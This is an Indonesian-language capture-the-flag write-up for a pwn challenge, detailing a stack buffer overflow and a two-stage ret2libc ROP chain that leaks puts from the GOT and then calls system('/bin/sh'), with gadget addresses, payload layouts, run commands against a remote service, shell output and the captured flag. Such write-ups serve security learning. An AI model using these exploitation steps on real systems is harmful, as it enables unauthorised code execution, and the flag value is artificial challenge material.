# q2 — RopCSU

## Ringkasan

Binary hanya menyediakan `puts` dan `read`. Tidak ada `win()`, jadi exploit memakai dua tahap: leak alamat libc lewat `puts@GOT`, lalu memanggil `system("/bin/sh")` dari libc.

## Proteksi Binary

Hasil `file` dan `checksec`:

```text
ELF 64-bit LSB executable, x86-64, dynamically linked, stripped
RELRO: Partial RELRO
Stack: No canary found
NX: NX enabled
PIE: No PIE (0x400000)
SHSTK: Enabled
IBT: Enabled
```

Binary memakai `libc.so.6` yang disediakan challenge. Karena PIE nonaktif, alamat gadget dan GOT binary tetap.

## Analisis Program

Fungsi utama berada di `0x401090`. Alurnya:

```asm
0x401090: sub rsp, 0x58
...
0x4010c2: lea rdi, [rip+0xf3f]   ; banner
0x4010c9: call puts@plt
0x4010ce: mov rsi, rsp
0x4010d1: mov edx, 0x200
0x4010d8: xor edi, edi
0x4010da: call read@plt
0x4010df: add rsp, 0x58
0x4010e3: ret
```

`read()` menulis maksimal `0x200` byte ke buffer yang hanya menyediakan `0x58` byte sebelum saved return address. Tidak ada canary, sehingga saved RIP dapat ditimpa.

## Vulnerability dan Offset

Offset RIP adalah `0x58`. Ini sesuai langsung dengan ukuran stack frame (`sub rsp, 0x58`) dan terbukti lewat payload overflow lokal yang berhasil mengarahkan eksekusi ke gadget ROP.

Primitive yang terbukti:

- arbitrary control-flow lewat saved RIP pada offset `0x58`;
- arbitrary read terbatas melalui `puts(puts@GOT)`;
- pemanggilan fungsi libc setelah base libc diketahui.

## Strategi Exploit

Binary memiliki gadget `pop rdi; ret` tersembunyi di rangkaian CSU pada `0x4011ed`. Entry PLT `puts` yang benar adalah `0x401060`; `0x401064` adalah instruksi internal setelah `endbr64` dan menyebabkan crash bila dipakai sebagai target ROP.

Tahap pertama:

```text
padding 0x58
pop rdi; ret
puts@GOT
puts@PLT
main (0x401090)
```

`puts` mencetak isi GOT yang berisi alamat runtime `puts` di libc. Setelah return ke main, program membaca payload kedua.

Tahap kedua:

```text
padding 0x58
ret                 ; alignment stack untuk libc
pop rdi; ret
alamat "/bin/sh"
alamat system
```

Base libc dihitung dengan:

```text
libc_base = leaked_puts - libc.sym["puts"]
```

Alamat `/bin/sh` dan `system` kemudian diambil relatif terhadap base tersebut. Tidak ada alamat libc yang di-hardcode.

## Exploit Final

Script lengkap ada di [`solve.py`](./solve.py). Mode yang tersedia:

```bash
source /home/nata/ctf_env/bin/activate
python3 solve.py
python3 solve.py GDB
python3 solve.py REMOTE HOST=35.192.106.100 PORT=20002
```

Mode lokal memakai `libc.so.6` di direktori challenge melalui `LD_LIBRARY_PATH`. Mode remote memakai leak runtime dari service lalu menghitung base secara dinamis.

## Validasi

Exploit lokal berhasil 3 kali berturut-turut, dengan leak dan base berbeda karena ASLR tetapi offset tetap valid. Contoh pola lokal:

```text
puts leak: 0x741a0d487cc0
libc base: 0x741a0d400000
uid=1000(nata) gid=1000(nata) ...
```

Remote juga memberikan leak valid dan shell interaktif. Flag dibaca langsung dari `/home/ctf/flag.txt` pada service:

```text
0xV01D{cc1033e9d2a8baefc04fb019}
```

## Catatan Stabilitas

Leak memiliki suffix yang cocok dengan offset `puts` pada libc challenge (`0x87cc0`). Gadget `ret` tambahan pada tahap kedua diperlukan untuk menjaga alignment stack saat masuk ke `system`. Shell remote tidak memakai TTY, sehingga muncul pesan `can't access tty`; command tetap dapat dijalankan normal.
